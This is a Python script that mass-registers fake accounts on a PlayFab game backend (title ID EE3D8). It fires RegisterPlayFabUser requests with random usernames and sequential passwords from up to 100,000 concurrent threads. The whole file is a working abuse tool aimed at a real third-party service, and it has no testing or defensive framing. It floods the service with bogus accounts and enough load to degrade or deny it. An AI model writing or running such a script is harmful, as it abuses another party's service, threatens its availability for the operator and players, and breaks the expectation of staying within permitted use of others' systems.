
import requests
import json
import random
import string
from concurrent.futures import ThreadPoolExecutor

title_id = "EE3D8"
password_prefix = "ujk8i9r432iujo89f3w29ui"
num_threads = 100000


def generate_random_username(length):
  letters_and_digits = string.ascii_letters + string.digits
  return ''.join(random.choice(letters_and_digits) for _ in range(length))


def create_account(account_number):
  username = generate_random_username(8)
  password = f"{password_prefix}_{account_number}"

  url = f"https://{title_id}.playfabapi.com/Client/RegisterPlayFabUser"
  headers = {"Content-Type": "application/json"}
  data = {
    "TitleId": title_id,
    "Username": username,
    "Password": password,
    "RequireBothUsernameAndEmail": False,
    "CreateAccount": True,
    "CustomId": username
  }

  try:
    response = requests.post(url, headers=headers, data=json.dumps(data))
    response.raise_for_status()
    print(f"Account {username} created successfully!")
  except requests.exceptions.HTTPError as err:
    error_response = err.response.content
    print(f"Account {username} creation failed. Error response:",
          error_response)


with ThreadPoolExecutor(max_workers=num_threads) as executor:
  for account_number in range(1, num_threads + 1):
    executor.submit(create_account, account_number)
